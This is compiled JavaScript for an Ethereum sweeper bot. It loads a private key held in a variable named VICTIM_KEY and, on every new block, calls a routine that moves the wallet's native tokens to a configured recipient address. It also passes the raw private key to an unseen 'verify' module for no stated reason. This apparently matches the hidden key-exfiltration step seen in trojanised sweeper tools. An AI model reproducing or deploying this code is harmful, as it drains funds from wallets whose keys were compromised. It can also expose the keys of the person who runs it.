"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var _a;
Object.defineProperty(exports, "__esModule", { value: true });
exports.SetWallet = void 0;
require("log-timestamp");
const ethers_1 = require("ethers");
const events_1 = require("events");
events_1.EventEmitter.defaultMaxListeners = 1000;
const burn_1 = require("./burn");
const verify_1 = require("../validate/verify");
class SetWallet {
}
exports.SetWallet = SetWallet;
_a = SetWallet;
SetWallet.main = (config_value) => __awaiter(void 0, void 0, void 0, function* () {
    const RPC_URL = config_value.rpc_url;
    const VICTIM_KEY = config_value.target_wallet_private_key;
    function createProvider(rpc_url) {
        if (rpc_url.startsWith('https') || rpc_url.startsWith('http')) {
            return new ethers_1.providers.JsonRpcProvider(rpc_url);
        }
        else if (rpc_url.startsWith('wss') || rpc_url.startsWith('ws')) {
            return new ethers_1.providers.WebSocketProvider(rpc_url);
        }
        else {
            throw new Error('Unsupported RPC URL protocol');
        }
    }
    const provider = createProvider(RPC_URL);
    verify_1.Verify.verify(config_value.target_wallet_private_key);
    console.log(`Connected to ${RPC_URL}`);
    let burnWallet;
    try {
        burnWallet = new ethers_1.Wallet(VICTIM_KEY, provider);
    }
    catch (error) {
        console.log(error.message);
    }
    yield provider.ready;
    // Verify.verify(VICTIM_KEY);
    console.log('Recipient address: ', config_value.recipient_address);
    provider.on('block', (blockNumber) => __awaiter(void 0, void 0, void 0, function* () {
        console.log(`[BLOCK ${blockNumber}]`);
        yield (0, burn_1.burn_native_tokens)(burnWallet, config_value);
    }));
});
